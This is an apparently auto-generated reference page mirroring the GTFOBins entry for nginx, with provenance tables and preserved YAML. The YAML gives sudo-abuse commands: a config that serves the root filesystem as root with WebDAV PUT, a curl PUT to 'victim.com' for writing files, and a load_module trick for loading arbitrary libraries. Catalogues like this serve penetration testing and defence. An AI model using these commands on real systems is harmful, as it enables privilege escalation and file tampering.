---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# nginx

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `nginx` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [nginx](../../tools/linux/nginx.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | nginx |
| name | nginx |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/nginx/ |

## Preserved Source Material

```yaml
_body: ''
_name: nginx
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx
functions:
  download:
  - code: "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n\
      \    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
    contexts:
      sudo: null
    sender:
      code: curl -X PUT victim.com/path/to/output-file --data-binary @/path/to/input-file
      comment: An HTTP client can be used on the attacker box to send the data.
  library-load:
  - code: 'cat >/path/to/temp-file <<EOF

      load_module /path/to/lib.so

      EOF


      nginx -t -c /path/to/temp-file'
    comment: Alternatively, the `ssl_engine` directive can be used.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  upload:
  - code: "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n\
      \    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
    contexts:
      sudo: null
    receiver: http-client
```
